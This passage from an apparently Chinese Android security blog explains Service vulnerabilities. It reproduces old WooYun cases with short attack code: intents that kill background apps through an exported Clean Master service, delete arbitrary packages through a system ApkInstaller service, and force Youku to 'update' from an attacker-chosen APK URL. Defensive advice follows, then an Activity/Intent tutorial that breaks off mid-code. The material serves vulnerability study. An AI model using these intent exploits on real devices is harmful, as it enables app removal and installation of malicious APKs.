<span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();<span class=\"comment\">//Intent intent = new Intent(&quot;活动&quot;)</span></span><br><span class=\"line\">intent.setAction(<span class=\"string\">&quot;XXX&quot;</span>);<span class=\"comment\">//service中定义的action</span></span><br><span class=\"line\">intent.setPackage(getPackageName);需要设置的应用包名</span><br><span class=\"line\">startService(intent);</span><br><span class=\"line\">（<span class=\"number\">2</span>）使用包名启动</span><br><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span>·Intent();</span><br><span class=\"line\"><span class=\"type\">ComponentName</span> <span class=\"variable\">componentName</span> <span class=\"operator\">=</span> New <span class=\"title function_\">ComponentName</span><span class=\"params\">(getPackageName()</span>,<span class=\"string\">&quot;com.example.testservices.TestService&quot;</span>);</span><br><span class=\"line\">intent.setComponent(componentName);</span><br><span class=\"line\">startService(intent);</span><br></pre></td></tr></table></figure>\n\n<p><strong>通过bindService启动：</strong></p>\n<p>我们要实现服务或活动之间的通信，我们要使用bind通信机制</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">原理解析：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）bindService启动的服务和调用者是典型的client-server模式。调用者是client，service是server端。service只有一个，但是绑定到service上的client可以有一个或多个。</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）client可以通过IBinder接口获取Service实例，从而实现在client端直接调用Service，实现灵活交互</span><br><span class=\"line\">\t（<span class=\"number\">3</span>）bindService启动服务的生命周期与其绑定的client息息相关，当client销毁时，绑定解除，或者使用unbindService()方法解除绑定</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">实现步骤：</span><br><span class=\"line\">\t服务端：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）定义一个类继承Service</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）在Service的onBind()方法中返回IBinder类型的实例</span><br><span class=\"line\">\t（<span class=\"number\">3</span>）在service中创建binder的内部类，加入类似getService()的方法返回Service，这样绑定的client就可以通过getService()方法获得Service实例了</span><br><span class=\"line\">\t客户端：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）在Manifest.xml文件中配置该Service</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）创建ServiceConnection类型实例，并重写onServiceConnected()方法和onServiceDisconnected()方法</span><br><span class=\"line\">\t（<span class=\"number\">3</span>）当执行到onServiceConnected回调时，可通过IBinder实例得到Service实例对象，这样可实现client与Service的连接</span><br><span class=\"line\">\t（<span class=\"number\">4</span>）onServiceDisconnected回调被执行时，表示client与Service断开连接，在此可以写一些断开连接后需要做的处理</span><br><span class=\"line\">\t（<span class=\"number\">5</span>）通过Intent 启动服务<span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(<span class=\"built_in\">this</span>,MyService.class);</span><br><span class=\"line\">\t（<span class=\"number\">6</span>）使用Context的bindService(Intent,ServiceConnection,<span class=\"type\">int</span>)方法启动该Service</span><br><span class=\"line\">\t（<span class=\"number\">7</span>）不再使用时，调用unbindService(ServiceConnection)方法停止该服务</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Service漏洞的种类和危害\"><a href=\"#2-Service漏洞的种类和危害\" class=\"headerlink\" title=\"2.Service漏洞的种类和危害\"></a>2.Service漏洞的种类和危害</h3><p>Service漏洞的种类大致可以分为：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/2.png\" alt=\"image-20210908160946499\"></p>\n<p>Service漏洞的危害：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Service是android四大组件之一，可以长时间的运行在后台。一个组件可以绑定到一个service来进行交互，即使这个交互是进程间通讯也没问题。Service不是分离开的进程，除非其他特殊情况，它不会运行在自己的进程，而是作为运行它的进程的一部分。Service不是线程，意味着它将在主线程里劳作。</span><br><span class=\"line\">如果一个导出的Service没有做严格的限制，任何应用都可以去启动并绑定到这个Service上，取决于被暴露的功能， 这可以是一个应用去执行未授权的行为，获取敏感信息或污染修改内部应用的状态造成威胁。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、Service漏洞原理分析和复现\"><a href=\"#三、Service漏洞原理分析和复现\" class=\"headerlink\" title=\"三、Service漏洞原理分析和复现\"></a>三、Service漏洞原理分析和复现</h2><h3 id=\"1-权限提升漏洞\"><a href=\"#1-权限提升漏洞\" class=\"headerlink\" title=\"1.权限提升漏洞\"></a>1.权限提升漏洞</h3><h4 id=\"（1）原理介绍\"><a href=\"#（1）原理介绍\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">当一个service配置了intent-filter默认是被导出的，如果没对调用Service进行权限，限制或者是没有对调用者的身份进行有效验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意行为发生比如调用具有system权限的删除卸载服务删除卸载其他应用。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞复现\"><a href=\"#（2）漏洞复现\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>案例1：<a href=\"https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048735\"><strong>猎豹清理大师内存清理权限泄露漏洞</strong></a></p>\n<p>漏洞描述：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android应用程序猎豹清理大师（原金山清理大师）<span class=\"number\">4.0</span><span class=\"number\">.1</span>及以下版本存在权限泄漏漏洞，泄露的权限为android.permission.RESTART_PACKAGES，用来结束进程来达到清理内存的目的。当没有申请此权限的app向猎豹清理大师发送相应的intent时，便可以结束后台运行的部分app进程。</span><br><span class=\"line\">猎豹清理大师暴露了com.cleanmaster.appwidget.WidgetService服务组件（详见下图），当向此服务发送action为com.cleanmaster.appwidget.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/3.png\" alt=\"image-20210908160946499\"></p>\n<p>攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">intent.setAction(<span class=\"string\">&quot;com.cleanmaster.appwidget.ACTION_FASTCLEAN&quot;</span>);</span><br><span class=\"line\">intent.setPackage(<span class=\"string\">&quot;com.cleanmaster.appwidget.WidgetService&quot;</span>);</span><br><span class=\"line\">startService(intent);</span><br></pre></td></tr></table></figure>\n\n<p>我们通过Intent隐私启动，给服务发送action为com.cleanmaster.appwidget.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程</p>\n<p>案例2：<a href=\"https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2010-0509\"><strong>乐phone手机任意软件包安装删除漏洞</strong></a></p>\n<p>漏洞描述：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">乐phone手机出厂默认包含一个名为jp.aplix.midp.tools的应用包。本应用以system权限运行，并向其他应用提供ApkInstaller服务，用来进行对Apk文件的安装和删除。通过向ApkInstaller服务传递构造好的参数，没有声明任何权限的应用即可达到安装和删除任意Package的行为，对系统安全性产生极大影响。</span><br></pre></td></tr></table></figure>\n\n<p>攻击代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">in.setComponent(<span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(<span class=\"string\">&quot;jp.aplix.midp.tools&quot;</span>,<span class=\"string\">&quot;jp.aplix.midp.tools.ApkInstaller&quot;</span>));</span><br><span class=\"line\">in.putExtra(<span class=\"string\">&quot;action&quot;</span>, <span class=\"string\">&quot;deleteApk&quot;</span>);</span><br><span class=\"line\">in.putExtra(<span class=\"string\">&quot;pkgName&quot;</span>, <span class=\"string\">&quot;xxxxx&quot;</span>);</span><br><span class=\"line\">startService(in);</span><br></pre></td></tr></table></figure>\n\n<p>我们通过Intent隐式启动，外部服务启动的方式，启动action为deleteApk的服务，来达到删除任意Package的行为</p>\n<h3 id=\"2-service劫持\"><a href=\"#2-service劫持\" class=\"headerlink\" title=\"2.service劫持\"></a>2.service劫持</h3><h4 id=\"（1）原理介绍-1\"><a href=\"#（1）原理介绍-1\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">攻击原理：隐式启动services,当存在同名services,先安装应用的services优先级高</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/4.png\" alt=\"image-20210908160946499\"></p>\n<h3 id=\"3-消息伪造\"><a href=\"#3-消息伪造\" class=\"headerlink\" title=\"3.消息伪造\"></a>3.消息伪造</h3><h4 id=\"（1）原理介绍-2\"><a href=\"#（1）原理介绍-2\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">暴露的Service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞复现-1\"><a href=\"#（2）漏洞复现-1\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>案例：<a href=\"https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094635\"><strong>优酷Android 4.5客户端升级漏洞</strong></a></p>\n<p>漏洞描述：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">优酷Android <span class=\"number\">4.5</span>客户端组件暴露导致第三方应用可以触发其升级过程，同时可以指定升级下载的URL地址，可导致任意应用安装！</span><br><span class=\"line\">源代码：</span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onHandleIntent</span><span class=\"params\">(Intent intent)</span> &#123;</span><br><span class=\"line\">        Intent v0;</span><br><span class=\"line\">        String v23;</span><br><span class=\"line\">        <span class=\"type\">Serializable</span> <span class=\"variable\">pushMsg</span> <span class=\"operator\">=</span> intent.getSerializableExtra(<span class=\"string\">&quot;PushMsg&quot;</span>);</span><br><span class=\"line\">        ......</span><br><span class=\"line\">        AppVersionManager.getInstance(Youku.context).showAppAgreementDialog();</span><br><span class=\"line\">        <span class=\"keyword\">switch</span>(pushMsg.type) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">1</span>: &#123;</span><br><span class=\"line\">                goto label_53;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            ......</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ......</span><br><span class=\"line\">    label_53:</span><br><span class=\"line\">        intent.setFlags(<span class=\"number\">876609536</span>);</span><br><span class=\"line\">        intent.setClass(<span class=\"built_in\">this</span>, UpdateActivity.class);</span><br><span class=\"line\">        intent.putExtra(<span class=\"string\">&quot;updateurl&quot;</span>, pushMsg.updateurl);</span><br><span class=\"line\">        intent.putExtra(<span class=\"string\">&quot;updateversion&quot;</span>, pushMsg.updateversion);</span><br><span class=\"line\">        intent.putExtra(<span class=\"string\">&quot;updatecontent&quot;</span>, pushMsg.updatecontent);</span><br><span class=\"line\">        intent.putExtra(<span class=\"string\">&quot;updateType&quot;</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.startActivity(intent);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    ......</span><br></pre></td></tr></table></figure>\n\n<p>漏洞分析：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们可以发现从Intent从获取名为PushMsg的Serializable的数据，并根据其成员type来执行不同的流程，当type值为<span class=\"number\">1</span>时，执行App的升级操作。升级所需的相关数据如app的下载地址等也是从该序列化数据中获取。升级的具体流程在com.youku.ui.activity.UpdateActivity中，简单分析后发现升级过程未对下载地址等进行判断，因此可以任意指定该地址。</span><br></pre></td></tr></table></figure>\n\n<p>漏洞攻击：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>创建一个Android App程序，在主Activity中的关键代码如下：</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">PushMsg</span> <span class=\"variable\">pushMsg</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PushMsg</span>();</span><br><span class=\"line\">pushMsg.type = <span class=\"number\">1</span>;</span><br><span class=\"line\">pushMsg.updateurl = <span class=\"string\">&quot;http://gdown.baidu.com/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;</span>;</span><br><span class=\"line\">pushMsg.updatecontent = <span class=\"string\">&quot;This is Fake&quot;</span>;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">intent.setClassName(<span class=\"string\">&quot;com.youku.phone&quot;</span>,<span class=\"string\">&quot;com.youku.service.push.StartActivityService&quot;</span>);</span><br><span class=\"line\">intent.putExtra(<span class=\"string\">&quot;PushMsg&quot;</span>, pushMsg);</span><br><span class=\"line\">startService(intent);</span><br><span class=\"line\"></span><br><span class=\"line\">其中PushMsg类不需要完整实现，只需要编译通过即可；</span><br><span class=\"line\"><span class=\"number\">2.</span>反编译优酷客户端的App得到smali代码，从中提取出PushMsg.smali；</span><br><span class=\"line\"><span class=\"number\">3.</span>反编译上述创建的APK文件，将原PushMsg类的smali文件替换为优酷中的PushMsg.smali文件，重新打包签名；</span><br><span class=\"line\"><span class=\"number\">4.</span>安装并运行重打包后的APK，会看到优酷的升级页面触发，如果设计的好的话，是可以诱导用户安装攻击者指定的APK文件的。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-拒绝服务攻击\"><a href=\"#4-拒绝服务攻击\" class=\"headerlink\" title=\"4.拒绝服务攻击\"></a>4.拒绝服务攻击</h3><h4 id=\"（1）原理介绍-3\"><a href=\"#（1）原理介绍-3\" class=\"headerlink\" title=\"（1）原理介绍\"></a>（1）原理介绍</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Service的拒绝服务主要来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致程序崩溃。主要体现在给Service传输的intent或者传输序列化对象导致接收时候的类型传化异常。</span><br></pre></td></tr></table></figure>\n\n<p>Service拒绝服务攻击和Activity拒绝服务攻击的原理一样，可以参考我们上篇帖子</p>\n<h4 id=\"（2）漏洞复现-2\"><a href=\"#（2）漏洞复现-2\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>案例：<a href=\"https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048028\"><strong>雪球最新Android客户端存在空指针异常及信息泄露漏洞</strong></a></p>\n<p>漏洞描述：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">雪球客户端版本：4.1</span><br><span class=\"line\">adb shell 下执行下面命令，虚拟机将崩溃。愿意在于空指针调用</span><br></pre></td></tr></table></figure>\n\n<p>攻击样例：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/5.png\" alt=\"image-20210908160946499\"></p>\n<h2 id=\"四、Service的安全防护\"><a href=\"#四、Service的安全防护\" class=\"headerlink\" title=\"四、Service的安全防护\"></a>四、Service的安全防护</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">安全防护：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）私有service不定义intent-filter并且设置exported为<span class=\"literal\">false</span></span><br><span class=\"line\">\t（<span class=\"number\">2</span>）公开的service设置exported为<span class=\"literal\">true</span>，intent-filter可以定义或者不定义</span><br><span class=\"line\">\t（<span class=\"number\">3</span>）合作service需对合作方的app签名做校验</span><br><span class=\"line\">\t（<span class=\"number\">4</span>）只被应用本身使用的service应设置为私有</span><br><span class=\"line\">\t（<span class=\"number\">5</span>）service接收的数据需要谨慎处理</span><br><span class=\"line\">\t（<span class=\"number\">6</span>）内部service需要使用签名级别的protectionLevel来判断是否未内部应用调用</span><br><span class=\"line\">\t（<span class=\"number\">7</span>）不应在service创建（onCreate方法被调用）的时候决定是否提供服务，应在onStartCommand/onBind/onHandleIntent等方法被调用时做判断</span><br><span class=\"line\">\t（<span class=\"number\">8</span>）当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险</span><br><span class=\"line\">\t（<span class=\"number\">9</span>）有明确的服务需调用时使用显示意图</span><br><span class=\"line\">\t（<span class=\"number\">10</span>）尽量不发送敏感信息</span><br><span class=\"line\">\t（<span class=\"number\">11</span>）启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"五、实验总结\"><a href=\"#五、实验总结\" class=\"headerlink\" title=\"五、实验总结\"></a>五、实验总结</h2><p>本文对Android APP的service漏洞挖掘做了一个初步的总结，并且对service的工作原理做了一个初步讲解。一些样本漏洞可能比较老，作为初步学习使用，后续会陆续补充一些新的相关漏洞案例，很多service漏洞在android版本升级后，可能不复存在，所以这里只是初步的总结学习记录。</p>\n<h2 id=\"六、参考网址\"><a href=\"#六、参考网址\" class=\"headerlink\" title=\"六、参考网址\"></a>六、参考网址</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android第一行代码</span><br><span class=\"line\">https://github.com/WooyunDota/DroidDrops</span><br><span class=\"line\">https://segmentfault.com/a/1190000011325759</span><br><span class=\"line\">https://blog.csdn.net/NewActivity/article/details/103243638</span><br><span class=\"line\">https://tech.meituan.com/2017/09/14/android-binde-kcon.html</span><br><span class=\"line\">https://blogs.360.cn/post/android-app%E9%80%9A%E7%94%A8%E5%9E%8B%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.html</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（9）——Activity漏洞挖掘详解","url":"/2023/02/13/bug0009/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>最近在总结Android APP漏洞挖掘方面的知识，上篇帖子<a href=\"https://bbs.pediy.com/thread-269196.htm\">Android漏洞挖掘三板斧——drozer+Inspeckage(Xposed)+MobSF</a>向大家初步的介绍了Android APP漏洞挖掘过程中常见的工具，这里也是我平时使用过程中比较常用的三套件，今天我们来逐步学习和复现Android中 Activity漏洞挖掘部分知识，每个漏洞挖掘部分，我们都会选择具有代表性的样本案例给大家演示。</p>\n<span id=\"more\"></span>\n<h2 id=\"二、Activity漏洞初步介绍\"><a href=\"#二、Activity漏洞初步介绍\" class=\"headerlink\" title=\"二、Activity漏洞初步介绍\"></a>二、Activity漏洞初步介绍</h2><h3 id=\"1-Activity基本介绍\"><a href=\"#1-Activity基本介绍\" class=\"headerlink\" title=\"1.Activity基本介绍\"></a>1.Activity基本介绍</h3><p>在学习Activity的漏洞挖掘之前，我们先对Activity的基本运行原理有一个初步的认识</p>\n<h4 id=\"（1）Intent-调用Activity\"><a href=\"#（1）Intent-调用Activity\" class=\"headerlink\" title=\"（1）Intent 调用Activity\"></a>（1）Intent 调用Activity</h4><p>首先，我们要启动Activity，完成各个Activity之间的交互，我们需要使用Android中一个重要的组件Intent</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Intent是各个组件之间交互的一种重要方式，它不仅可以指明当前组件想要执行的动作，而且还能在各组件之间传递数据。Intent一般可用于启动Activity、启动Service、发送广播等场景。</span><br><span class=\"line\">Intent有多个构造函数的重载，Intent（Context packageContext,Class&lt;?&gt; cls）<span class=\"comment\">//参数1：启动活动的上下文 参数2：想要启动的目标活动</span></span><br><span class=\"line\">我们构建好一个Intent对象后，只需要使用 startActivity(Intent)来启动就可以了     </span><br></pre></td></tr></table></figure>\n\n<p>Intent一般分为显式Intent和隐私Intent：</p>\n<p><strong>显示Intent打开Activity：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(MainActivity.class,SecondActivity.class); <span class=\"comment\">//实例化Intent对象</span></span><br><span class=\"line\">intent.putExtra(<span class=\"string\">&quot;et1&quot;</span>,et1Str); <span class=\"comment\">//使用putExtra传递参数，参数1：键名 参数2：键对应的值 我们可以使用intent.getStringExtra(&quot;et1&quot;)获取传递的参数</span></span><br><span class=\"line\">startActivity(intent); <span class=\"comment\">//启动Intent，完成从MainActivity类跳转到SecondActivity类</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>隐式Intent打开Activity:</strong></p>\n<p>隐式Intent并不指明启动那个Activity而是指定一系列的action和category，然后由系统去分析找到合适的Activity并打开，action和category一般在AndroidManifest中指定</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">activity</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SecondActivity&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;com.example.test.ACTION_START&quot;</span> /&gt;</span>  </span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">category</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>只有<code>&lt;action&gt;</code>和<code>&lt;category&gt;</code>中的内容能够匹配上Intent中指定的action和category时，这个活动才能响应Intent</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> Intent(<span class=\"string\">&quot;com.example.test.ACTION_START&quot;</span>)；</span><br><span class=\"line\">startActivity(intent)；</span><br></pre></td></tr></table></figure>\n\n<p>我们这里只传入了<code>ACTION_START</code>，这是因为<code>android.intent.category.DEFAULT</code>是一种默认的category，在调用<code>startActivity()</code>时会自动将这个category添加到Intent中，注意：<strong>Intent中只能添加一个action，但是可以添加多个category</strong></p>\n<p>对于含多个category情况，我们可以使用<code>addCategory()</code>方法来添加一个category</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">intent.addCategory(<span class=\"string\">&quot;com.example.test.MY_CATEGORY&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p><strong>隐私Intent打开程序外Activity：</strong></p>\n<p>例如我们调用系统的浏览器去打开百度网址</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(Intent.ACTION_VIEW);</span><br><span class=\"line\">intent.setData(Uri.parse(<span class=\"string\">&quot;https://www.baidu.com&quot;</span>));</span><br><span class=\"line\">startActivity(intent);</span><br></pre></td></tr></table></figure>\n\n<p><code>Intent.ACTION_VIEW</code>是系统内置的动作，然后将<code>https://www.baidu.com</code>通过<code>Uri.parse()</code>转换成Uri对象，传递给<code>intent.setData(Uri uri)</code>函数</p>\n<p>与此对应，我们在<intent-filter>中配置<data>标签，用于更加精确指定当前活动能够响应什么类型的数据：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">android:scheme：用于指定数据的协议部分，如https</span><br><span class=\"line\">android:host：用于指定数据的主机名部分，如www.baidu.com</span><br><span class=\"line\">android:port：用于指定数据的端口，一般紧随主机名后</span><br><span class=\"line\">android:path：用于指定数据的路径</span><br><span class=\"line\">android:mimeType：用于指定支持的数据类型</span><br></pre></td></tr></table></figure>\n\n<p>只有当<code>&lt;data&gt;</code>标签中指定的内容和Intent中携带的data完全一致时，当前Activity才能响应该Intent。下面我们通过设置data，让它也能响应打开网页的Intent</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">activity</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SecondActivity&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;com.example.test.action.VIEW&quot;</span> /&gt;</span>  </span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">category</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">data</span> <span class=\"attr\">android:scheme</span>=<span class=\"string\">&quot;http&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们就能通过隐式Intent的方法打开外部Activity</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(Intent.ACTION_VIEW);</span><br><span class=\"line\">intent.setData(Uri.parse(<span class=\"string\">&quot;https://www.baidu.com&quot;</span>));</span><br><span class=\"line\">startActivity(intent);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）Activity中传递数据\"><a href=\"#（2）Activity中传递数据\" class=\"headerlink\" title=\"（2）Activity中传递数据\"></a>（2）Activity中传递数据</h4><p><strong>向下一个活动传递数据：</strong></p>\n<p>Intent传递字符串：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(MainActivity.class,SecondActivity.class);</span><br><span class=\"line\">intent.putExtra(<span class=\"string\">&quot;et1&quot;</span>,et1Str); </span><br><span class=\"line\">startActivity(intent);</span><br></pre></td></tr></table></figure>\n\n<p>Intent接收字符串：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> getIntent();</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">data</span> <span class=\"operator\">=</span> intent.getStringExtra(<span class=\"string\">&quot;et1&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p><strong>返回数据给上一个活动：</strong></p>\n<p>Android 在返回一个活动可以通过Back键，也可以使用<code>startActivityForResult()</code>方法来启动活动，该方法在活动销毁时能返回一个结果给上一个活动</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(MainActivity.class,SecondActivity.class);</span><br><span class=\"line\">startActivityForResult(intent,<span class=\"number\">1</span>); <span class=\"comment\">//参数1：Intent  参数2：请求码,用于之后回调中判断数据来源</span></span><br></pre></td></tr></table></figure>\n\n<p>我们在SecondActivity中返回数据</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">intent.putExtra(<span class=\"string\">&quot;data&quot;</span>,data);</span><br><span class=\"line\">setResult(RESULT_OK,intent);  <span class=\"comment\">//setResult接收两个参数，参数1：向上一个活动返回处理结果，RESULT_OK或RESULT_CANCELED 参数2：把带数据Intent返回出去</span></span><br><span class=\"line\">finish();  <span class=\"comment\">//销毁当前活动</span></span><br></pre></td></tr></table></figure>\n\n<p>当活动销毁后，就会回调到上一个活动，所以我们需要在MainActivity中接收</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\">   <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onActivityResult</span><span class=\"params\">(<span class=\"type\">int</span> requestCode, <span 